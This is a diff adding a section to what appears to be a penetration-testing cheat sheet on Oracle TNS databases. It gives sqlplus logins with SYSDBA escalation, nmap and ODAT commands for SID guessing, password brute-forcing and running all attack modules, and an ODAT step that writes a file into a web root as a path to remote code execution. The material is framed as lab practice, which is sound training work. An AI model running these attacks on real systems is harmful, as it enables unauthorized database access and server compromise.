@@ -5,6 +5,91 @@ description: "Discover Oracle listener and instance details, connect with SQL*Pl
 keywords: ["oracle", "tns", "sid", "sqlplus", "odat", "1521", "rdbms"]
 ---
 
+## sqlplus: choose the operation and read the result
+
+Connect to an Oracle database.
+
+### What the result establishes
+
+Identify the Oracle service/SID and selected account before interpreting catalog or role queries.
+
+### Prerequisites and common failures
+
+A TNS listener response does not guarantee the guessed service name or credentials are valid; privileged SYSDBA access is a separate role.
+
+### Example 1: Commands
+
+Run in: **Client with Oracle tools**.
+
+```bash
+sqlplus USER/PASSWORD@TARGET_IP/SERVICE_NAME
+```
+
+### Example 2: Connecting (SQL*Plus)
+
+Run in: **Saved lab example**.
+
+```bash
+sqlplus <user>/<pass>@<IP>/<SID>                # standard login
+sqlplus scott/tiger@10.129.204.235/XE
+
+sqlplus <user>/<pass>@<IP>/<SID> as sysdba      # escalate to DBA at login if allowed
+```
+
+Saved context: [Oracle Database and TNS Enumeration — Connecting (SQL*Plus)](/enumeration/oracle-tns-rdbms-cheat-sheet#connecting-sql-plus). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## ODAT: choose the operation and read the result
+
+Use the saved Oracle assessment commands.
+
+### What the result establishes
+
+Tie each module result to the identified Oracle service, supplied account and database privilege.
+
+### Prerequisites and common failures
+
+ODAT modules vary greatly in impact and prerequisites; inspect the specific module instead of treating an all-module run as ordinary banner enumeration.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+odat sidguesser -s TARGET_IP
+```
+
+### Example 2: Post-exploitation → RCE (ODAT)
+
+Run in: **Saved lab example**.
+
+```bash
+echo "test" > testing.txt
+python3 odat.py utlfile -s <IP> -d <SID> -U <user> -P <pass> --sysdba \
+  --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt   # Windows web root
+# Linux web root: /var/www/html
+curl http://<IP>/testing.txt                                  # verify
+```
+
+Saved context: [Oracle Database and TNS Enumeration — Post-exploitation → RCE (ODAT)](/enumeration/oracle-tns-rdbms-cheat-sheet#post-exploitation-→-rce-odat). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Footprinting & SID enumeration
+
+Run in: **Saved lab example**.
+
+```bash
+sudo nmap -p1521 -sV <IP> --open                          # version + confirm listener
+sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute # brute-force SIDs
+
+# ODAT (Oracle Database Attacking Tool)
+python3 odat.py sidguesser -s <IP> -p 1521                 # find valid SIDs
+python3 odat.py passwordguesser -s <IP> -p 1521 -d XE      # brute creds for SID XE
+python3 odat.py all -s <IP> -d XE -U <user> -P <pass>      # run every attack module
+```
+
+Saved context: [Oracle Database and TNS Enumeration — Footprinting & SID enumeration](/enumeration/oracle-tns-rdbms-cheat-sheet#footprinting-&-sid-enumeration). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Existing notes and worked examples
+
 {/* SERVICE_TOOLS_START */}
 
 ## Tools for this service
